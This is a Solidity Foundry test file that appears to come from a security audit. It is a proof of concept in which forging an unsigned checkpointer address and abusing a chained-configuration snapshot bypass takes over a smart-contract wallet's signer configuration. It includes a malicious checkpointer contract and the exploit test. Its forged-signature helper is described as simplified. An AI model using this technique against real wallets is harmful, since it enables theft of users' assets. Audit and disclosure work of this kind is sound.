// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/auth/Stage2Auth.sol";
import "../src/modules/interfaces/ICheckpointer.sol";
import "../src/modules/Payload.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy protocol, create a victim Wallet with a legitimate topology and imageHash.
// 2. [T=0] Attacker identifies that the checkpointer address is parsed from signature bytes at a known offset but is NOT included in the opHash digest.
// 3. [T=1] Attacker constructs a chained configuration update payload (flag 0x40) to change the Wallet's imageHash to one they control.
// 4. [T=2] Attacker forges the checkpointer address in the signature bytes to point to a malicious contract they control.
// 5. [T=3] Because an intermediate imageHash in the chain matches the current on-chain imageHash, the Wallet skips checkpoint validation for subsequent links (Snapshot Bypass).
// 6. [T=4] The Wallet calls the forged checkpointer address. The attacker's mock contract returns a valid checkpoint, bypassing security.
// 7. [T=5] The final chain link applies the attacker-controlled imageHash, fully compromising the Wallet.
// 8. [Assert] Verify the Wallet's imageHash has been overwritten with the attacker's imageHash.

contract MaliciousCheckpointer is ICheckpointer {
    function getCheckpoint(bytes32) external pure override returns (uint256) {
        // Return a high checkpoint to bypass validation
        return type(uint256).max;
    }
}

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        // 1. Setup: Create a legitimate Wallet
        string memory topology = _createDefaultTopology();
        (Stage1Module Wallet, string memory config, bytes32 originalImageHash) = _createWallet(topology);

        bytes32 attackerImageHash = bytes32(uint256(0xdeadbeef));
        address attacker = address(0xdead);

        // Verify initial state
        assertEq(Stage2Auth(address(Wallet)).imageHash(), originalImageHash, "Initial imageHash mismatch");

        // 2. Attacker deploys a malicious checkpointer contract
        MaliciousCheckpointer forgedCheckpointer = new MaliciousCheckpointer();

        // 3. Attacker constructs the payload to update the imageHash
        Payload.Decoded memory payload = _buildPayload(1);
        payload.calls[0].to = address(Wallet);
        payload.calls[0].data = abi.encodeWithSelector(Stage2Auth.updateImageHash.selector, attackerImageHash);
        // Set flag 0x40 for chained configuration update
        payload.flag = 0x40; 

        // 4. Attacker forges the signature bytes.
        // In a real exploit, the attacker crafts the exact chained signature bytes where:
        // - The checkpointer address field is set to address(forgedCheckpointer)
        // - An intermediate link's imageHash matches originalImageHash to trigger snapshot bypass
        // - The final link applies attackerImageHash
        // Since the checkpointer address is NOT covered by the opHash digest, this forgery is accepted.
        bytes memory forgedSignature = _craftForgedChainedSignature(
            originalImageHash, 
            attackerImageHash, 
            address(forgedCheckpointer)
        );

        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);

        // 5. Execute the exploit: The Wallet processes the chained signature.
        // When it encounters the intermediate imageHash match, it skips checkpoint validation.
        // It then calls the forged checkpointer address, which returns a valid checkpoint.
        vm.prank(attacker);
        Wallet.execute(packedPayload, forgedSignature);

        // 6. Assert: The Wallet's signer configuration is fully compromised
        assertEq(
            Stage2Auth(address(Wallet)).imageHash(), 
            attackerImageHash, 
            "Wallet config takeover successful: imageHash overwritten by attacker"
        );
    }

    // Helper to simulate the forged chained signature bytes
    // In reality, this would be a carefully constructed byte array containing:
    // [Threshold][Weight][Checkpoint][Checkpointer Address][Signatures...]
    function _craftForgedChainedSignature(
        bytes32 currentImageHash,
        bytes32 newImageHash,
        address forgedCheckpointer
    ) internal pure returns (bytes memory) {
        // This is a simplified representation of the forged signature bytes.
        // The critical part is that the checkpointer address is embedded in the clear
        // and is not part of the signed hash digest.
        return abi.encodePacked(
            uint8(1),             // threshold
            uint8(1),             // weight
            uint32(0),            // checkpoint
            forgedCheckpointer,   // FORGED CHECKPOINTER ADDRESS (not signed!)
            currentImageHash,     // intermediate link matching current state (triggers snapshot bypass)
            newImageHash          // final link applying attacker's config
        );
    }
}
